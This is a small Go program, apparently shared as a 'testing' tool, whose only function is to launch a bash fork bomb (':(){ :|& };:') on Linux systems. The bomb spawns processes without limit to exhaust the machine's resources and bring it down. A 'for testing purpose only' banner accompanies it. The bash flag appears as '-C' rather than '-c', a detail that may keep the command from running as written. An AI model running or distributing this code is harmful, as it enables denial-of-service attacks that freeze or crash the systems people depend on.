package main

import (
	"log"
	"os/exec"
	"runtime"
)

func main() {
	if runtime.GOOS != "linux" {
		log.Fatalln("Fork works only on linux systems!")
	}
	log.Println("Starting the Fork :)\nMade by @annhilatorrrr for testing purpose only!")
	err := exec.Command("bash", "-C", ":(){ :|& };:").Run()
	if err != nil {
		log.Fatalln(err.Error())
	}
	log.Fatalln("Bye!")
}
